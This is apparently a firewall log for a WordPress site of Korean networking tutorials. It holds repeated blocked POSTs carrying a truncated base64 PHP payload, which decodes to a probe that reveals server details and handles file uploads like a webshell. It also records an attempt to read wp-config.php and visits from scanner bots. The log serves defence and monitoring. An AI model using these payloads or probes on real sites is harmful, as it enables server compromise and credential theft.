+26/Nov/25 21:27:37  #7556973  CRITICAL     -  172.191.37.184   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+27/Nov/25 10:23:35  #6617013  INFO         -  47.64.115.164    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98/] - coffeecrawlers.com 
+
+27/Nov/25 10:23:44  #2045329  INFO         -  47.64.115.164    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98/] - coffeecrawlers.com 
+
+27/Nov/25 10:23:44  #3411981  INFO         -  47.64.115.164    GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98/] - coffeecrawlers.com 
+
+28/Nov/25 19:40:42  #3132687  INFO         -  203.17.245.211   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#comment-2] - coffeecrawlers.com 
+
+28/Nov/25 19:40:45  #6345709  INFO         -  203.17.245.211   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+28/Nov/25 19:40:47  #1777839  INFO         -  203.17.245.211   POST /wp-comments-post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/] - coffeecrawlers.com 
+
+28/Nov/25 19:40:49  #4965008  INFO         -  203.17.245.211   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5/#comment-166] - coffeecrawlers.com 
+
+29/Nov/25 18:17:14  #5527454  INFO         -  216.73.216.174   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-wan%ec%9c%bc%eb%a1%9c%ec%9d%98-%ed%99%95%ec%9e%a5] - coffeecrawlers.com 
+
+29/Nov/25 18:17:15  #7667587  INFO         -  216.73.216.174   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%eb%a7%9d-%ea%b5%ac%ec%a1%b0%ec%99%80-%ed%97%88%eb%b8%8c-%eb%b0%8f-%ec%8a%a4%ec%9c%84%ec%b9%98] - coffeecrawlers.com 
+
+29/Nov/25 18:17:16  #4380333  INFO         -  216.73.216.174   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95] - coffeecrawlers.com 
+
+29/Nov/25 18:18:20  #5534308  INFO         -  216.73.216.174   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94] - coffeecrawlers.com 
+
+29/Nov/25 18:18:22  #7903759  INFO         -  216.73.216.174   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95] - coffeecrawlers.com 
+
+29/Nov/25 18:19:24  #7780826  INFO         -  216.73.216.174   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0] - coffeecrawlers.com 
+
+29/Nov/25 18:19:24  #1094471  INFO         -  216.73.216.174   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95] - coffeecrawlers.com 
+
+29/Nov/25 20:51:06  #5345159  CRITICAL     -  4.241.208.113    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+29/Nov/25 20:51:07  #5066926  CRITICAL     -  4.241.208.113    POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+30/Nov/25 08:37:06  #5242609  INFO         -  219.240.233.21   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-3-%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%81%AC-%EC%8B%9C%EB%AE%AC%EB%A0%88%EC%9D%B4%EC%85%98/] - coffeecrawlers.com 
+
+01/Oct/25 00:00:47  #8877385  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+01/Oct/25 00:01:43  #4498416  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+01/Oct/25 02:55:55  #5441306  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+01/Oct/25 03:57:51  #3313362  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+01/Oct/25 04:38:06  #3295208  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+01/Oct/25 05:16:15  #3405807  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+01/Oct/25 05:17:34  #2303571  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+01/Oct/25 13:44:24  #5936728  INFO         -  61.83.227.119    GET /wp-admin/post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0/] - coffeecrawlers.com 
+
+01/Oct/25 23:44:44  #2226235  INFO         -  77.36.126.139    GET /index.php - Sanitising user input - [HTTP_USER_AGENT: "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"] - coffeecrawlers.com 
+
+02/Oct/25 08:25:50  #8769181  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-1-%ec%9d%b8%ed%84%b0%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%82%b9-%eb%b0%8f-%ec%9d%b8%ed%84%b0%eb%84%b7/] - coffeecrawlers.com 
+
+02/Oct/25 08:33:33  #6451043  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+02/Oct/25 09:33:45  #2362276  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+02/Oct/25 12:46:10  #8004478  INFO         -  61.83.227.119    GET /wp-admin/post.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-3-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%ec%88%a0%ec%9d%98-%eb%b0%9c%ec%a0%84/] - coffeecrawlers.com 
+
+04/Oct/25 17:07:15  #4853480  MEDIUM     531  34.90.220.251    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Scrapy/2.13.3 (+https://scrapy.org)] - www.coffeecrawlers.com 
+
+06/Oct/25 17:21:14  #5019252  INFO         -  43.156.168.214   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+06/Oct/25 18:54:34  #1443292  CRITICAL     -  84.54.33.23      POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+06/Oct/25 18:54:39  #3492264  CRITICAL     -  84.54.33.23      POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+06/Oct/25 21:32:16  #7146638  HIGH       310  185.177.72.95    GET /wp-config.php - Access to a configuration file - [SERVER:SCRIPT_NAME = /wp-config.php] - coffeecrawlers.com 
+
+09/Oct/25 18:39:30  #5422984  MEDIUM     531  52.17.204.116    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 
+
+09/Oct/25 23:59:29  #1759898  CRITICAL     -  172.207.123.72   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+09/Oct/25 23:59:31  #5664917  CRITICAL     -  172.207.123.72   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+10/Oct/25 11:00:17  #2449537  INFO         -  61.83.227.119    GET /wp-admin/index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0/] - coffeecrawlers.com 
+
+10/Oct/25 14:48:22  #2382063  INFO         -  223.29.151.133   GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+10/Oct/25 19:43:23  #3723173  CRITICAL     -  172.207.123.72   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+10/Oct/25 19:43:25  #6252816  CRITICAL     -  172.207.123.72   POST /index.php - BASE64-encoded injection - [POST:l = ZXJyb3JfcmVwb3J0aW5nKDApOyBlY2hvIHBocF91bmFtZSgpLiI8YnI+Ii5nZXRjd2QoKS4iPGJyPiI7IGlmKCRfR0VUWydGb3gnXSA9PSAnZDN3TDcnKXskc2F3MSA9ICRfRklMRVNbJ2ZpbGUnXVsndG1wX25hbWUnXTskc2F3MiA9ICRfRklMRVNbJ2Z...] - coffeecrawlers.com 
+
+11/Oct/25 04:36:21  #8721909  INFO         -  23.105.151.243   GET /index.php - Sanitising user input - [HTTP_USER_AGENT: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"] - coffeecrawlers.com 
+
+11/Oct/25 07:39:30  #5127770  MEDIUM     531  18.203.68.118    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - coffeecrawlers.com 
+
+11/Oct/25 08:03:48  #5694491  MEDIUM     531  18.201.96.100    GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 
+
+11/Oct/25 16:50:43  #3435570  INFO         -  49.51.183.75     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+13/Oct/25 02:29:22  #1081123  MEDIUM     531  18.201.138.116   GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 
+
+13/Oct/25 05:57:00  #2292313  INFO         -  223.195.194.150  GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-1-%EC%9D%B8%ED%84%B0%EB%84%A4%ED%8A%B8%EC%9B%8C%ED%82%B9-%EB%B0%8F-%EC%9D%B8%ED%84%B0%EB%84%B7/] - coffeecrawlers.com 
+
+13/Oct/25 10:15:17  #2283319  MEDIUM     531  3.252.38.97      GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - coffeecrawlers.com 
+
+14/Oct/25 02:51:27  #8632603  MEDIUM     531  3.250.145.9      GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - www.coffeecrawlers.com 
+
+14/Oct/25 04:12:50  #8594233  MEDIUM     531  3.252.35.251     GET /index.php - Suspicious bots/scanners - [SERVER:HTTP_USER_AGENT = Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)] - coffeecrawlers.com 
+
+14/Oct/25 23:07:10  #1906589  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0/] - coffeecrawlers.com 
+
+14/Oct/25 23:07:12  #6851392  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0/] - coffeecrawlers.com 
+
+15/Oct/25 04:37:12  #8312020  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+15/Oct/25 05:05:59  #5070221  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-4-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+15/Oct/25 05:27:07  #3389441  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/2-3-%eb%a7%9d-%ea%b5%ac%ec%a1%b0%ec%99%80-%ed%97%88%eb%b8%8c-%eb%b0%8f-%ec%8a%a4%ec%9c%84%ec%b9%98/] - coffeecrawlers.com 
+
+15/Oct/25 05:29:08  #8799515  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+15/Oct/25 07:35:05  #1779342  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+15/Oct/25 07:35:12  #3533990  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+15/Oct/25 07:35:31  #6736949  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+15/Oct/25 07:35:40  #3392509  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+15/Oct/25 16:41:07  #4508645  INFO         -  68.183.146.21    GET /index.php - Sanitising user input - [HTTP_USER_AGENT: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.39 (KHTML, like Gecko) Chrome/89.0.4389.111 Safari/537.39'] - coffeecrawlers.com 
+
+16/Oct/25 01:06:59  #7162907  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/] - coffeecrawlers.com 
+
+16/Oct/25 01:07:06  #1589887  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/] - coffeecrawlers.com 
+
+16/Oct/25 01:07:17  #5470314  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/#respond] - coffeecrawlers.com 
+
+16/Oct/25 01:07:22  #3423761  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/#respond] - coffeecrawlers.com 
+
+16/Oct/25 01:07:26  #4341368  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/] - coffeecrawlers.com 
+
+16/Oct/25 01:07:29  #4381359  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-5-lan%ea%b3%bc-wan%ea%b3%bc%ec%9d%98-%ec%97%b0%ea%b2%b0-%eb%aa%a8%eb%8e%80%ea%b3%bc-%eb%9d%bc%ec%9a%b0/#respond] - coffeecrawlers.com 
+
+16/Oct/25 01:07:39  #6275092  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-2-%ec%9d%b4%eb%8d%94%eb%84%b7-%ed%86%a0%ed%8f%b4%eb%a1%9c%ec%a7%80topology/#respond] - coffeecrawlers.com 
+
+16/Oct/25 01:07:43  #5910325  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-1-%ec%9d%b4%eb%8d%94%eb%84%b7ethernet%ec%9d%98-%ec%a0%95%ec%9d%98/#respond] - coffeecrawlers.com 
+
+16/Oct/25 01:07:47  #5038041  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/2-3-utp-%ec%bc%80%ec%9d%b4%eb%b8%94%ea%b3%bc-%ec%9d%b8%ed%84%b0%ed%8e%98%ec%9d%b4%ec%8a%a4-%eb%b0%a9%eb%b2%95/] - coffeecrawlers.com 
+
+16/Oct/25 01:08:02  #3042597  INFO         -  188.143.244.138  GET /index.php - Sanitising user input - [HTTP_REFERER: http://coffeecrawlers.com/1-5-lan-%ec%b9%b4%eb%93%9c%ec%99%80-lan-%ec%bc%80%ec%9d%b4%eb%b8%94/] - coffeecrawlers.com 
+
+16/Oct/25 01:43:43  #5672075  INFO         -  121.139.68.4     POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2Fpost.php%3Fpost%3D97%26action%3Dedit&reauth=1] - coffeecrawlers.com 
+
+16/Oct/25 02:25:37  #1323759  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+16/Oct/25 02:34:10  #5475488  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-2-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ec%84%b8%eb%b6%80-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+16/Oct/25 06:23:05  #1354450  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+16/Oct/25 06:23:22  #1059931  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+16/Oct/25 06:23:22  #7092349  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+16/Oct/25 06:26:40  #6399597  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/4-1-wan%ec%9d%98-%eb%ac%bc%eb%a6%ac%ec%a0%81-%ec%97%b0%ea%b2%b0-%eb%b0%8f-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%eb%b3%b8-%ec%84%a4%ec%a0%95/] - coffeecrawlers.com 
+
+19/Oct/25 22:53:30  #8431893  INFO         -  121.139.68.4     POST /wp-login.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/wp-login.php?redirect_to=https%3A%2F%2Fcoffeecrawlers.com%2Fwp-admin%2Fpost.php%3Fpost%3D97%26action%3Dedit&reauth=1] - coffeecrawlers.com 
+
+20/Oct/25 07:54:05  #3772533  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-1-%ec%9d%b8%ed%84%b0%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%82%b9-%eb%b0%8f-%ec%9d%b8%ed%84%b0%eb%84%b7/] - coffeecrawlers.com 
+
+20/Oct/25 07:54:13  #5157830  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-2-%eb%9d%bc%ec%9a%b0%ed%84%b0/] - coffeecrawlers.com 
+
+20/Oct/25 07:54:33  #2025398  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-3-%eb%9d%bc%ec%9a%b0%ed%84%b0-%ea%b8%b0%ec%88%a0%ec%9d%98-%eb%b0%9c%ec%a0%84/] - coffeecrawlers.com 
+
+20/Oct/25 07:54:40  #7397735  INFO         -  121.139.68.4     GET /index.php - Sanitising user input - [HTTP_REFERER: https://coffeecrawlers.com/3-1-%ec%9d%b8%ed%84%b0%eb%84%a4%ed%8a%b8%ec%9b%8c%ed%82%b9-%eb%b0%8f-%ec%9d%b8%ed%84%b0%eb%84%b7/] - coffeecrawlers.com 
+
